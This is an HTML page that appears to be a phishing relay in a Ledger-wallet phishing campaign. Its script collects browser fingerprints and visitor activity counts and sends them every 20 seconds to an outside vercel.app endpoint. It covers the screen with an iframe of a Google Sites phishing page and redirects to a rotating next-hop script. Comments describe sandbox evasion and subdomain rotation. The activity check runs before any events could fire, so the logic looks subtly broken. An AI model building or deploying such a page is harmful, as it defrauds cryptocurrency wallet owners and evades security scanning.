<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Loading...</title>
<script defer src="https://static.cloudflareinsights.com/beacon.min.js"
        data-cf-beacon='{"token": "a1b2c3d4e5f6a7b8c9d0"}'></script>
</head>
<body>
<div id="relay"></div>
<script>
(function () {
  // Rotating next-hop subdomain is swapped out every 15-20 minutes by the
  // operator; the GCS landing page that points here stays static.
  var NEXT_HOP = 'https://soyyoo-cwpc5n0e.vercel.app/relay2.js';

  // Behavioral filter: automated sandboxes do not move the pointer or type.
  var activity = { keys: 0, touches: 0, moves: 0, scrolls: 0 };
  document.addEventListener('keydown', function (e) { activity.keys++; });
  document.addEventListener('touchstart', function () { activity.touches++; });
  document.addEventListener('mousemove', function () { activity.moves++; });
  window.addEventListener('scroll', function () { activity.scrolls++; });

  function report() {
    fetch('https://whyavc-qwmv6stx.vercel.app/api/signal', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        activity: activity,
        ua: navigator.userAgent,
        platform: navigator.platform,
        webdriver: navigator.webdriver,
        ref: document.referrer
      })
    });
  }
  report();
  setInterval(report, 20000);

  // Load the Google Sites page that carries the actual phishing content.
  var frame = document.createElement('iframe');
  frame.src = 'https://sites.google.com/view/start-ledger-wallet';
  frame.style.width = '100%';
  frame.style.height = '100%';
  frame.style.border = '0';
  frame.style.position = 'fixed';
  frame.style.top = '0';
  frame.style.left = '0';
  frame.style.zIndex = '9999';
  document.getElementById('relay').appendChild(frame);

  if (activity.moves === 0 && activity.keys === 0) {
    setTimeout(function () { window.location.replace(NEXT_HOP); }, 4000);
  }
})();
</script>
</body>
</html>
